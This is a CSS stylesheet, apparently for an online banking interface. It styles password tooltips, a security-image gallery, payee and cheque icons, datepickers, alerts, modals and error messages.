div.slideshow a.advance-link:hover, div.slideshow a.advance-link:active, div.slideshow a.advance-link:visited { text-decoration: none }
div.slideshow a.advance-link img { width: 205px; border: 5px solid #e8e6de; height: 205px; /* This should be set to be at least the height of the largest image in the slideshow */ }
div.slideshow img { vertical-align: middle; border: 1px solid #ccc; }
.imgleft a { margin-left: 0px!important }
ul.thumbs { clear: both; margin: 0; padding: 0; }
ul.thumbs li { float: none; padding: 0; margin: 0; list-style: none; }
a.thumb { padding: 0; display: inline; border: none; }
a.thumb img { width: 65px; height: 65px; }
ul.thumbs li.selected a.thumb { border: 3px solid Red; display: inline-block; }
ul.thumbs li.selected a.thumb img { width: 62px; height: 62px; }
ul.thumbs li:last-child { margin-left: 34.1%!important }
ul.thumbs li.selected a.thumb:hover img { width: 62px; height: 62px; margin: 0px!important; }
ul.thumbs li a.thumb:hover img { width: 70px; height: 70px; margin: -2.5px 2.5px 2.5px -2.5px; overflow: visible!important; }
a.thumb:focus { outline: none }
ul.thumbs img { border: none; display: block; }
/*--------------------------security image gallery css end---------------------*/
/*------------password info tooltip css start-------*/
#pswd_info { position: absolute; overflow: visible; /*bottom: -75px;   ; bottom: -105px\9; /* IE Specific */: ; /*right: 55px;*/ margin-top: 2px; margin-left: 50px; width: 250px; z-index: 1060;}
#pswd_info .passarr { background: url(../images/tooltip_edge.png) 30px top no-repeat; height: 10px; margin-bottom: -1px; position: relative; }
#pswd_info .passcon { background: #ffffff; padding: 15px 15px 10px 15px; border: 1px solid #CCCCCC; box-shadow: 0 6px 12px rgba(0, 0, 0, .175); }
#pswd_info .passcon ul { margin: 0; padding: 0; }
#pswd_info .passcon ul li { list-style: none; margin: 0; padding: 0 0 0 15px; }
#pswd_info h4 { margin: 0 0 10px 0; padding: 0; font-size: 1em; }
/*#pswd_info::before {
    background:#fefefe;
    content: "\25B2"!important;
    position:absolute;
    top:-12px;
    left:45%;
    font-size:14px;
    line-height:14px;
    color:#ddd;
    text-shadow:none;
    display:block;border:1px solid red;
}*/
.invalid { background: url(../images/error_12x10.png) no-repeat 0 6px!important; padding-left: 22px; padding-bottom: 3px!important; padding-top: 3px!important; color: #696969; vertical-align: text-top; }
.valid { background: url(../images/success_12x10.png) no-repeat 0 6px!important; padding-left: 22px; padding-bottom: 3px!important; padding-top: 3px!important; color: #696969; vertical-align: text-top; }
.bullet { background: url(../images/bullet_12x10.png) no-repeat 0 50%; padding-left: 22px; line-height: 24px; color: #696969; }
#pswd_info { display: none }
#repswd_info { display: none }
.has-error #repswd_info { display: none }
.has-error #repswd_info { position:absolute; margin-left: 50px; margin-top:2px!important; width: 250px;z-index: 1060;}
#repswd_info { position: absolute;  margin-left: 50px; margin-top: 2px; width: 250px; z-index: 1060; }
#repswd_info .passarr { background: url(../images/tooltip_edge.png) 30px top no-repeat; height: 10px; margin-bottom: -1px; position: relative; display: block; }
#repswd_info .passcon { background: #ffffff; padding: 15px 15px 10px 15px; border: 1px solid #CCCCCC; box-shadow: 0 6px 12px rgba(0, 0, 0, .175); }
#repswd_info .passcon ul { margin: 0; padding: 0; }
#repswd_info .passcon ul li { list-style: none; margin: 0; padding: 0 0 0 15px; }
#repswd_info h4 { margin: 0 0 10px 0; padding: 0; font-size: 1em; }
.navleft { padding-right: 5px!important; padding-left: 20px!important; }
.navleft .exp-collapse a:before { color: #ffffff!important; font-size: 14px!important; margin: -1px 10px 0 -15px; }
.navleft .exp-collapse a { margin-left: 10px }
.navleft .exp-collapse h5 a { margin-left: 0px; font-size: 1.2rem!important; }
.navleft .hr-separator { margin-bottom: 0px }
.ACnumber { text-align: right; margin-right: 25px; display: inline-block; position: absolute; right: 20px; }
.accountDataset { padding: 15px; background: #e7e7e7; text-align: right!important; }
.accountDataset-bdp { padding: 11px; padding-bottom: 0px; text-align: right!important; }
.accountDataset-bdp .data-set { text-align: left!important; background: #e7e7e7; padding: 15px 15px 15px 0; }
.accountDataset .data-set { text-align: left!important; background: #e7e7e7; padding: 15px 15px 0 15px; border-bottom: 1px solid #ffffff; }
.accountDataset .data-set div { padding-left: 0!important; margin-bottom: 5px; }
.accountDataset button { margin-top: 20px }
.account-balance-container .toggle-btn { padding-bottom: 10px!important; padding-top: 5px!important; height: 30px!important; display: block; text-align: center; float: none; clear: both; vertical-align: top; overflow: hidden; }
.account-balance-container .toggle-btn:before { display: inline-block }
.tandcHolder { border: 1px solid #d7d7d7; height: 300px; background: #fff; overflow: scroll; padding: 10px; }
.tandcHolder h4 { margin-top: 0px }
.SATAppletHolder { border: 1px solid #d7d7d7; background: #fff; overflow: hidden; text-align: center; }
.SATAppletHolder img { width: 100% }
.passwordinfo ul { margin: 0; padding: 0; }
.passwordinfo ul li { list-style: none; margin: 0; padding: 0 0 0 15px; }
.wizard_top_border { border-top: 1px solid #d8d8d8 }
.device_image { }
.device_image ol { margin: 0 0 0 5px; padding: 0; }
.whitebackground { background: #ffffff!important }
.whitebackground:hover { background: #ffffff!important; border-color: transparent !important; }
.whiteborder{ border:1px solid transparent!important;}
/*  Add Payee/Recipients button */
.btn-default{text-shadow:none;}

a.add-payee > span,a.add-recipient > span{
                vertical-align: top;
                display: inline-block;
                width: 20px;
                height: 20px;
}

a.add-recipient > span,a.add-recipient > span:hover { background: transparent url(../images/add-recipient-white.png) left top no-repeat; }

a.add-payee > span,a.add-payee > span:hover { background: transparent url(../images/add-payee_white.png) left top no-repeat;}

a.add-payee,a.add-recipient{
  padding: 4px 16px 4px 22px;
}
a.add-payee.payment-transfer-activity,a.add-recipient.payment-transfer-activity{
  margin-right:8px !important;
  margin-left:20px;
}

button.dropdown-toggle.payment-transfer-activity{
  width:60px;
  height: 30px;
  top:-1px;
}
a.new-button.payment-transfer-activity{
  min-width:60px;
  height: 29px;
  padding:5px 10px !important;
  border: 1px solid #da1c05!important; background: #da1c05!important;
}
ul.dropdown-menu.payment-transfer-activity {
  top:10px;
}
div.sub-header-bg.payment-transfer-activity {
  white-space: normal;
}

button.payment-transfer-activity.add-payee{position:absolute; margin:0 0 0 -68px;}
.open > .payment-transfer-activity.add-payee {background-color: #fff !important; border-top: 1px solid #cccccc!important;
    border-right: 1px solid #cccccc!important;    border-left: 1px solid #cccccc!important;    border-bottom: 1px solid #fff!important;  important; border-radius:3px 3px 0 0!important; z-index: 1001 !important; }
.open .payment-transfer-activity.add-payee span.caret {border-top-color: #333;}
.open > .payment-transfer-activity.add-payee .user-icon-white {background: url(../images/add-payee_gray.png) left top no-repeat;}

.bp-max-amount-info {
    background-color: white;
    padding: 15px;
    border: solid 1px #E4E4E4;
    border-radius: 4px;
    margin: 16px;
}

.bp-max-amount-info::after {
    content: "";
    clear: both;
    display: table;
}

.bp-max-amount-info > img {
    float: left;
}

.bp-max-amount-info > span {
    float: right;
    width: 94%;
}

.RUIFW-nav-tabs .quick-menu_TransfersoverviewPage { margin:-3px 10px 0 0;}

.user-icon { background: #ffffff url(../images/add-payee.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.user-icon:hover { background: #ffffff url(../images/add-payee_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.user-icon-white { background: url(../images/add-payee_white.png) left top no-repeat; width: 20px; height: 20px; display:inline-block; margin-top:3px; }
.user-icon-white:hover { background:url(../images/add-payee_white.png) left top no-repeat; width: 20px; height: 20px; display: inline-block;margin-top:3px; }
.dollar-icon { background: #ffffff url(../images/dollar-sign_red.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.dollar-icon-grey { background: #ffffff url(../images/dollar-sign_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.dollar-icon:hover { background: #ffffff url(../images/dollar-sign_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.trash-icon { background: #ffffff url(../images/trash_red.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.trash-icon:hover { background: #ffffff url(../images/trash_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.pencil-icon { background: #ffffff url(../images/edit_red.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.pencil-icon-gray { background: #ffffff url(../images/edit_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.pencil-icon:hover { background: #ffffff url(../images/edit_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.userADD-icon { background: #ffffff url(../images/add-payees.png) left top no-repeat; width: 27px; height: 20px; display: block; }
.userADD-icon:hover { background: #ffffff url(../images/add-payees_gray.png) left top no-repeat; width: 27px; height: 20px; display: block; }
.stop-cheque-icon { background: #ffffff url(../images/stop-cheque.png) left top no-repeat; width: 30px; height: 20px; display: block; }
.stop-cheque-icon:hover { background: #ffffff url(../images/stop-cheque_grey.png) left top no-repeat; width: 30px; height: 20px; display: block; }
.protect-cheque-icon { background: #ffffff url(../images/protect-cheque.png) left top no-repeat; width: 30px; height: 20px; display: block; }
.protect-cheque-icon:hover { background: #ffffff url(../images/protect-cheque_grey.png) left top no-repeat; width: 30px; height: 20px; display: block; }
.New-iconbtn { height: 30px!important; background: #d81e05!important; border: 1px solid #bd0000; padding: 1px!important; margin: 10px 15px 0 0!important; width: 40px!important; }
.New-iconbtn3 { height: 20px!important; background: #d81e05!important; border: 1px solid #bd0000!important; padding: 1px!important; margin: 0px 10px 0 0!important; width: 40px!important; }
.New-iconbtn:hover { background: #ed1c00!important }
.New-icontxt { display: block!important; nowhitespace: afterproperty; color: #ffffff!important; font-size: 11px; font-family: Arial, Helvetica, sans-serif; font-weight: normal; /*margin-right: 15px!important;*/ text-shadow:none;; }
.New-icontxt:hover { display: block!important; color: #ffffff!important; font-size: 11px; font-family: Arial, Helvetica, sans-serif; }
a .New-icontxt { margin-top:1px }
.New-iconbtn2 { height: 20px!important; background: #d81e05!important; border: 1px solid #bd0000!important; margin: 10px 15px 0 0!important; width: auto!important; padding: 0 7px 0 7px!important; }
.New-iconbtn2:hover { background: #ed1c00!important;border: 1px solid #bd0000!important; }
.New-iconbtn3:hover { background: #ed1c00!important;border: 1px solid #bd0000!important; }
.userADD-icon1 { background: #ffffff url(../images/add-payees.png) center 10px no-repeat; width: 27px; height: 20px; display: block; }
.userADD-icon1:hover { background: #ffffff url(../images/add-payees_gray.png) center 10px no-repeat; width: 27px; height: 20px; display: block; }
.New-icontxt1 { display: block; color: #d81e05!important; font-size: 11px; font-family: Arial, Helvetica, sans-serif; font-weight: bold; margin-right: 15px!important; width: 27px; height: 20px; }
.New-icontxt1:hover { display: block; color: #606060!important; font-size: 11px; font-family: Arial, Helvetica, sans-serif; font-weight: bold; width: 27px; height: 20px; }
/*.tabletextmiddle { margin-top:-10px!important;}_NO__DOTCOMMA__AFTER__*/
.tabletextmiddle tr td { vertical-align: middle!important }
.btn.actionicon-btn.icon-btn, .RUIFW-btn.icon-btn { height: 40px; width: 40px; color: #ffffff!important; }
a.btn.actionicon-btn.icon-btn, a.RUIFW-btn.icon-btn { height: 40px; width: 40px; color: #ffffff!important; float: none; overflow: hidden; clear: both; vertical-align: top; display: inline-block; text-align: center; background-color:#ffffff!important; border:none!important; }
a.RUIFW-btn.icon-btn span { position: relative; right: 5px; top: 5px; }
.btn.actionicon-btn { background-color: #fff; color: #d71e05!important; padding: 10px; }
.topupoverbut_align { padding-top: 3px }
.topupoverbut_align button.New-iconbtn { padding: 15px; height: 40px; width: 75px!important; clear: both; vertical-align: top; }
.payoverbut_align button{ padding: 15px; height: 40px; width: 45px!important; clear: both; vertical-align: top; }
.topupoverbut_align a.New-iconbtn { padding: 15px; height: 40px; width: 75px!important; clear: both; vertical-align: top; }
.payoverbut_align a{ /*padding: 15px; height: 40px; width: 45px!important;*/ clear: both; vertical-align: top; }
.payoverbut_align button span { }
.payoverbut_align { position: relative; vertical-align: top; margin: -40px 0 0 0; float: right; height: 40px; clear: both; }
.payoverbut_align4 { position: relative; nowhitespace: afterproperty; margin: 5px 5px -15px 0!important; display: inline-block; overflow: visible; /*border-right: 1px solid #606060;*/; }
.payoverbut_align4 button.New-iconbtn { width: 75px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align4 a.New-iconbtn { width: 75px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align4 a:hover{border-bottom: none !important;}
.payoverbut_align4 input.New-iconbtn { width: 75px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align2 { position: relative; nowhitespace: afterproperty; margin: 5px 5px -15px 0!important; overflow: visible; /*border-right: 1px solid #606060;*/; }
.payoverbut_align2 button { width: 45px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align2 a { /*width: 45px!important;*/ vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align2 input { width: 45px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align3 { position: absolute; nowhitespace: afterproperty; margin: 10px 0 0 -110px!important; display: inline-block; overflow: visible; /*border-right: 1px solid #606060;*/ text-align:left; display:inline-block; width:100px;; }
.payoverbut_align3 button { vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align3 a { vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align3 input { vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.accnt-act-details3 p { margin: 0; vertical-align: text-top; word-break: initial;}
.accnt-act-details3 p span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: initial; width: 60%; white-space: pre-wrap; vertical-align: text-top; }
.accnt-act-details3 label { width: 35%; font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; word-break: iinitial; }
.accnt-act-details3 .links_acct_details { vertical-align: bottom; text-align: right; width: 99.5%; }
.accnt-act-details6 .links_acct_details { vertical-align: bottom; text-align: right; width: 99.5%; }
.item-description td div.accnt-act-details6 { /*  margin-left: 5%;*/padding:0px;white-space:normal;; width: 100%; }
.accnt-act-details6 p { margin: 0; vertical-align: text-top; word-break: initial;}
.accnt-act-details6 p span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: initial; width: 60%; vertical-align: text-top; }
.accnt-act-details6 label { width: 35%; font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; word-break: iinitial; }
.Filter-content { padding: 20px; margin: 5px 0 0 0; }
.Filter-content input { margin-top: 3px }
.Filter-content select { margin-top: 3px }
.Filter-content table { border: none!important }
.Filter-content table tr td { border: none!important; vertical-align: middle; }
.Filter-content table tr th { border-right: 0px solid #ffffff!important; background: transparent!important; }
.Filter-content table tr td a { margin-top: 15px }
.Filter-content table tr td a:last-child { margin-left: 10px }
.Filter-content table tr td a:first-child { margin-right: 10px }
.fliterButtons { vertical-align: top; text-align: right; padding: 15px 0 0  0; }
table tr.selected { display: table-row }
table tr.highlighted { background-color: #fbfbfb }
table tr.highlighted td { border-bottom: 1px solid #fbfbfb }
.item-description td { border-top: 1px solid #fbfbfb }
.table { margin-bottom: 0!important }
.wizard-form-content input[type="checkbox"] { vertical-align: text-bottom }
.wizard-form-title_border { border: 1px solid #d8d8d8 }
.Tab_overview_details_head { display: inline-block; margin-top: 5px!important; margin-left: 5px!important; }
.preAutButicons { margin: 0 }
.preAutButicons button.RUIFW-btn { background-color: #ffffff!important; border: none; }
.preAutButicons button { float: left; margin-right: 10px!important; height: 50px!important; width: 50px!important; }
.preAutButicons button.newicon span { height: auto!important }
.preAutButicons .newicon{ padding:0!important;}
.preAutButicons .deletepayee{ padding:0!important;}
.preAutButicons span.trash-icon { margin-left: 0px }
.preAutButicons h5 { font-size: 1.2em; margin: 0!important;   }
.preAutButicons p { margin-top: 3px!important }
.preAutButicons .New-icontxt { color: #d81e05!important; font-weight: bold; }
.preAutButicons .icon-bookmark { color: #d81e05!important }
.preAutButicons .icon-bookmark:hover { color: #606060!important }
.preAutButicons .New-icontxt:hover { color: #606060!important }


.preAutButicons .RUIFW-btn { background-color: #ffffff!important; border: none; float: left!important; margin-right: 10px!important; height: 50px!important; width: 50px!important;}
.preAutButicons .RUIFW-btn img{ margin-top:10px;}
.preAutButicons .newicon span { height: auto!important }

.icon-bookmark:before { content: "\f02e" }
input[type="radio"] { margin-right: 5px!important; display: inline-block; background-color: none!important; border: 1px solid #cccccc; border: none; }
.RUIFW-row label { font-weight: bold; color: #606060; font-size: 1.3rem; font-size: 13px; }
.modellabel { margin-bottom: -15px!important; min-height: 1px!important; padding-left: 15px; }
Select.form-control { /* width: 269px!important; _NO__DOTCOMMA__AFTER__*/ }
.form-control { height: 30px!important; font-size: 12px; padding: 6px 5px; }
.signin-imp { border: 1px solid #d7d7d7; background-color: #ffffff; padding: 10px; margin-bottom: 10px; }
.active:focus { outline: none!important }
.activeEvent:focus { outline: none!important }
button:focus { outline: none!important }
.active a:focus { outline: none!important }
F
.carousel-control:focus { outline: none!important }
.greyBG { background: #f7f8fa!important }
.greyTXT { color: #e0e0e0!important }
.small_text { font-size: 0.9em!important; display: block!important; }
.compareInterestRates .modal-dialog { border: 1px solid red!important }
.RUIFW-btn-sm { filter: none !important; line-height: 10px; padding: 4px 5px; min-height: 16px; }
.btn-sm, .btn-xs { padding: 0 5px!important; font-size: 12px; line-height: 1.5; border-radius: 3px; }
/*datepicker*/
.datepicker:before { display: none }
.datepicker thead tr:first-child { background-color: #f7f8fa }
.datepicker th { font-weight: normal!important; color: #606060!important; }
.datepicker td, .datepicker th { text-align: center; width: 20px; height: 20px; border: none; }
.future-dates-calendar .datepicker table tr td.disabled, .future-dates-calendar .datepicker table tr td.disabled:hover { background: none; color: #5E5E5C; cursor: default; }
.datepicker table tr td.old, .datepicker table tr td.new { background-color: #f9f9f7 !important }
.datepicker table tr td { background-color: #d6d6d4 !important; border: 1px solid #fff !important; color: #5e5e5c; }
.datepicker td, .datepicker th { border-radius: 0 }
.datepicker td.active.today, .datepicker td.active.today:hover { text-shadow: none!important; background: none; }
.datepicker td.active, .datepicker td.active:hover { color: #fff; filter:none !important; }

.datepicker table tr td.activeEvent, .datepicker table tr td.activeEvent:hover, .datepicker table tr td.activeEvent.disabled, .datepicker table tr td.activeEvent.disabled:hover { background: url(../images/calendar_sel.png); background-repeat: no-repeat; background-position: center; background-size: 30px 30px; color: #fff; cursor: pointer;  }

.datepicker.dropdown-menu th, .datepicker.datepicker-inline th, .datepicker.dropdown-menu td, .datepicker.datepicker-inline td { padding: 10px 8px 10px 8px }
.datepicker td, .datepicker th { text-align: center; width: 44px; height: 20px; }
.datepicker-switch { font-size: 1.5rem; font-size: 15px; }
.datepicker th.datepicker-switch { width: 145px }
/*alert box*/
*[class*="alert-"] { border-radius: 0 0 0 0 }
.alert-success { background: #d3ecba; border-color: #acdc79; color: #333333; padding: 25px 0 24px 0; margin: 5px!important; }
.icon-success { background: url(../images/success-message.png) right top no-repeat; width: 30px; height: 33px; padding-left: 66px; display: inline-block; margin-right: 37px!important; }
.alert span { margin: 0 10px; float: left; }
.close_icon { background: url(../images/close.png) center top no-repeat; width: 15px; height: 15px; border: 0; float: right; margin: -15px 10px 0 0; }
.alert-info { background: #cae4f2; border-color: #98bddd; color: #333333; padding: 25px 0 24px 0;  margin: 5px!important;}
.icon-msg { background: url(../images/Message-generic.png) right top no-repeat; width: 30px; height: 33px; padding-left: 66px; display: inline-block; margin-right: 37px!important; }
.alert-warning { background: #fcf38b; border-color: #e1cd7f; color: #333333; padding: 25px 0 24px 0;  margin: 5px!important;}
.alert.has-icon { padding-left: 50px }
.alert-icon-error { background: url(../images/error-message.png) right top no-repeat; width: 30px; height: 33px; }
.alert-icon-info { background: url(../images/warning_message.png) right top no-repeat; width: 30px; height: 33px; padding-left: 66px; display: inline-block; margin-right: 37px!important; }
.main-icons li .dropdown-menu { position: absolute; left: auto!important; right: 10px!important; width: 60%; }
.main-icons li .HelpHolder { width: 40% }
.main-icons li .HelpHolder_caribbean { width: 35% }
.main-icons li .settings_caribbean { width: 50% }
/*.navbar-nav > li > .dropdown-menu {
margin-top: 15px;
margin-left: -15px;
border-top-right-radius: 0;
border-top-left-radius: 0;}*/
.modal-header { min-height: 16.428571429px; padding: 25px 15px 0 30px; border-bottom: none; }
.modal-header .close { position: absolute; margin-top: -2px; right: 12px!important; top: 12px!important; }
.close { font-size: 20px; color: #000000!important; text-shadow: none; }
.modal-title { margin: 0; line-height: 1.428571429; text-align: left; color: #D81E05; font-size: 2em; }
.modal-body { position: relative; padding: 10px 30px 15px 30px; }
.modal-content { border-radius: 0px; webkit-box-shadow: none; box-shadow: none; }
.borderwhite { border: 1px solid transparent }
.border { border-top: 1px solid #f5f5f5!important; border-left: 1px solid #f5f5f5!important; }
.contenttbs table tr td { border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 1px solid #f5f5f5!important; vertical-align: top; }
.modal-footer { padding: 10px 20px 25px; margin-top: 5px; text-align: right; border-top: none; }
.border td:last-child { text-align: right; border-right: 1px solid #f5f5f5!important; }
.border tbody { border-bottom: 1px solid #f5f5f5!important }
.table > tbody > tr > td { border-top: 1px solid #f5f5f5 }
.RUIFW-modal .close_icon { margin: -15px -5px 0 0 }
.RUIFW-hide, .RUIFW-page-break { display: none!important; overflow: hidden!important; }
.exp-collapse a.Open:before { content: "\f0d7"!important }
.table > thead > tr > th { font-weight: normal }
h1 { margin-top: 16px; margin-bottom: 15px; }
.RUIFW-append > *[class*="icon"] { left: auto }
*[class*="RUIFW-container"] .RUIFW-row + .RUIFW-row { margin-top: 18px }
.RUIFW-row.row-note { margin-top: 5px !important; }
.token-holder { margin-left: 0px!important; vertical-align: top; }
h5 { font-size: 1.4em; color: #606060; font-weight: normal; }
.other_options .radio, .other_options .checkbox { margin-top: 0; margin-bottom: 0; float: none; clear: both; min-height: 34px; margin-bottom: 20px; }
.other_options fieldset .form-control { width: 90%; float: right; }
.other_options fieldset { vertical-align: middle }
.other_options fieldset .radio input[type="radio"] { margin-left: 0; border: none; background-color: none!important; padding-right: 0; border: none!important; }
.other_options fieldset label .form-control { float: none; display: inline-block; font-weight: normal; margin: 0 5px 0 5px; }
.other_options .radio label, .other_options .checkbox label { padding-left: 32px; font-weight: normal; }
.other_options .radio.untilCancel { margin-bottom: 8px; }
[class^="icon-"]:before, [class*=" icon-"]:before { text-decoration: inherit; display: inline-block!important; speak: none; }
.modal-dialog { margin-top: 120px }
*[class*="RUIFW-inline"] > * + * { margin-left: 0px }
.alert { margin-bottom: 0!important }
.alert-danger, .alert-error { background-color: #f2cacc; border-color: #e17f7f; background-image: none; padding: 25px 0 24px 0; color: #333333; margin: 5px!important;}
.RUIFW-modal .alert-danger, .RUIFW-modal .alert-error { background-color: #f2cacc; border-color: #e17f7f; background-image: none; padding: 25px 0 24px 0; color: #333333;margin: 0px 0px 15px 0px!important;}
.RUIFW-modal .alert-msg{width: 70%!important;}
.RUIFW-modal .alert-danger .close_icon, .RUIFW-modal .alert-error .close_icon{
 margin: -15px 10px 0 0;}
.alert-icon-error { background: url(../images/error-message.png) right top no-repeat; width: 30px; height: 33px; padding-left: 66px; display: inline-block; margin-right: 37px!important; }
.carousel-control { padding: 37% 0 0 0; height: 100%; text-shadow: none; font-size: 55px; color: #5f5f5f; text-align: center; }
.carousel-control:hover { color: #5f5f5f }
.carousel-control.left { background: none; left: -20px; filter: none; }
.carousel-control.right { background: none; left: 95%; filter: none; }
.wrapfrom label { margin-bottom: 0!important }
.banner-image img { width: 100% }
.banner-image { margin-top: 20px }
.wizard-form-title_2 input[type="radio"], .wizard-form-title_2 input[type="checkbox"] { margin: 0 }
input[type="radio"], input[type="checkbox"] { margin: 0 }
.leftappend > span { margin-left: 10px; right: auto!important; }
.leftappend > input { padding-left: 25px!important ; padding-right: 5px!important ;}
.leftappend > .has-error > input { padding-left: 25px!important; padding-right: 5px!important ; }
fieldset .radio label { padding: 1px 0 0 0 !important; font-weight: normal; vertical-align: top; top: 2px; line-height: line-height: 25px; }
.radio-inline-label { display:inline!important;padding-right:20px!important;font-weight:normal!important;vertical-align:top!important;}
table.radio-inline-table tr td {vertical-align: top!important;white-space: normal!important;}
.popover { max-width: 276px }
.popover .close { font-size: 14px; margin-right: -5px; }
.popover-content {height: 150px; width: 270px; overflow:auto;}
.popover p { margin-top: 3px; font-weight: bold; }
.popover ul { list-style: none; margin: 0; padding: 0; }
.popover ul li { vertical-align: top; margin-bottom: 5px; border-bottom: 1px solid #d6d6d4; padding-top: 5px; }
.popover ul li span { display: inline-block; width: 65%; margin-right: 5px; height: 20px; overflow: hidden; }
.datepicker td span.active:hover, .datepicker td span.active:focus, .datepicker td span.active:active, .datepicker td span.active.active, .datepicker td span.active.disabled, .datepicker td span.active[disabled] { background-color: #da1c05 }
.datepicker td span.active { background-image: none }
.datepicker .year.old,.datepicker .year.new{display:none;}
.datepicker .year.disabled,.datepicker .month.disabled{color: #999999;}
.datepicker  td span.disabled:hover{background: none;}
.RUIFW-date-picker-wrap > *[class*="icon"], .RUIFW-prepend > *[class*="icon"], .RUIFW-append > *[class*="icon"] { font-size: 17px; top: 7px; }
.alert_links { margin-top: 5px }
.alert_links a { margin: 0 8px 0 8px }
.alert_links a:first-child { margin-left: 0px }
.alert-msg { width: 80% }
.alert-msg strong { margin-right: 5px }
.btn-primary[disabled] { background-color: #c5c5c5; border: 1px solid #b8b8b8; }
.RUIFW-btn[disabled] { background-color: #c5c5c5!important; border: 1px solid #b8b8b8!important; }
.tooltip div { text-align: left }
.tooltip-inner { width: 200px!important; max-width: 400px!important; padding: 8px 8px 8px 10px; text-align: left; white-space: normal!important; }
.width760 { width: 760px }
.fontsize14 { font-size: 0.8em; font-weight: normal; }
.no-border { border-bottom: 0 }
.red-text { color: #d81e05 }
.progress { margin-bottom: 0px }
Select options { height: 20px!important; margin: 5px 0 5px 10px!important; }
*[class*="RUIFW-inline"] > .form-control { width: 100% }
.checkbox label { padding-left: 0px; font-weight: normal; vertical-align: text-top!important; min-height: 12px!important; }
*[class*="RUIFW-inline"] .radio, *[class*="RUIFW-inline"] .checkbox { line-height: 18px; margin-right: 20px; vertical-align:top!important; }
button.pull-left { margin-left: 0px }
.RUIFW-prepend > span, .RUIFW-append > span { line-height: 3.0rem; padding-top: -2px; padding-left: 5px; }
.RUIFW-append input { padding-right: 28px }
table tr td { /*word-wrap: break-word;  Internet Explorer 5.5+  word-break: break-all; */ white-space: pre-wrap; }
.homebottomtable table tr td.actions { word-wrap: normal!important; /* Internet Explorer 5.5+ */ word-break: normal!important; white-space: normal!important; }
.homebottomtable .quick-menu ul.dropdown-menu { margin: 18px -20px 0 0!important }
.overview-table tr td.actions { word-wrap: normal!important; /* Internet Explorer 5.5+ */ word-break: normal!important; white-space: normal!important; }
.overview-table tr td.actions .quick-menu ul.dropdown-menu { margin: 18px -20px 0 0!important }
.datepicker:after { content: none }
.modal { overflow-y: auto }
.modal-open { overflow: auto; overflow-x: hidden; overflow-y: scroll; }
.has-error { white-space: nowrap }
.has-error .tt-dropdown-menu{ white-space:inherit!important;  }
.has-error .twitter-typeahead{ display:inherit!important; }
strong.has-error .form-control{ font-weight:normal!important;}
.has-error .RUIFW-tooltip { vertical-align: top; margin-top: 5px; border-radius:4px; }
.has-error div { display: inline-block; vertical-align: top; }
.has-error .tokenlink_if_error { position: absolute; left: 14px; top: 30px; }
.has-error .form-alt-txt{ white-space:pre-line;}
.has-error .form-control { border-color: #D81E05; display: inline-block!important; vertical-align: top; }
.has-error.form-control { border-color: #D81E05; display: inline-block!important; vertical-align: top; }
input[type="radio"].has-error  { border-color: #D81E05!important; }
.has-error.form-control:focus {  border-color: #843534;  -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483; box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483;}
.leftappend .has-error input{white-space:inherit; display:block!important; }
.Filter-content .has-error > *[class*="icon"] {top: 10px;}
.error-msg { color: #D81E05; nowhitespace: afterproperty; display: inline-block!important; margin: 5px 0 0 20px!important; text-align: left!important; word-wrap: break-word!important; /* Internet Explorer 5.5+ */ white-space: pre-wrap!important; width: 85%!important; }
.error-msg-below { color: #D81E05; nowhitespace: afterproperty; display: inline-block!important; margin: 0 0 0 0!important; text-align: left!important; word-wrap: break-word!important; /* Internet Explorer 5.5+ */ white-space: pre-wrap!important; width: 85%!important; }
.error-msg.error_width50{width: 50%!important;}
.error-msg.error_width60{width: 60%!important;}
.error-msg.error_width70{width: 70%!important;}
.error-msg.for_token { width: 60%!important; margin-left: 35px!important; }
.error-msg.for_wrap { margin: 5px 0 0 0!important }
table.has-error { border: 1px solid #D81E05!important }
tr.has-error { border: 1px solid #D81E05!important }
tr.has-error td { border-top: 1px solid #D81E05!important; border-bottom: 1px solid #D81E05!important; }
tr.has-error td span.error-msg { font-weight: normal }
.mini_Ad a { color: #2A5DB0!important; text-decoration: none!important; display: inline-block!important; font-size: 13px!important; padding: 0 0 0 8px; }
.mini_Ad {background:#ffffff;}
.mini_Ad h3 { color: #D81E05; margin: 0px; padding-top: 3px; }
.mini_Ad a:hover { color: #F00!important }
.mini_Ad  a:before { content: none!important; margin: 0px!important; }
.Large_Ad { margin: 0 0 -1px 0; border: 1px dotted #D7D7D7!important; padding-top: 5px; padding-bottom: 10px; background:#ffffff; }
.Large_Ad img { margin: 15px!important; max-width: 100%; padding-right: 20px; height: auto; }
.LG_medium_Ad { margin: 15px 0 15px 0; border: 1px dotted #D7D7D7!important; padding-bottom: 15px; }
.LG_medium_Ad img { max-width: 100%; height: auto; }
.S_medium_Ad { margin: 0 0 15px 0; border: 1px dotted #D7D7D7!important; padding-top: 15px!important; padding-bottom: 15px!important; background:#ffffff;}
.S_medium_Ad img { max-width: 100%; height: auto; }
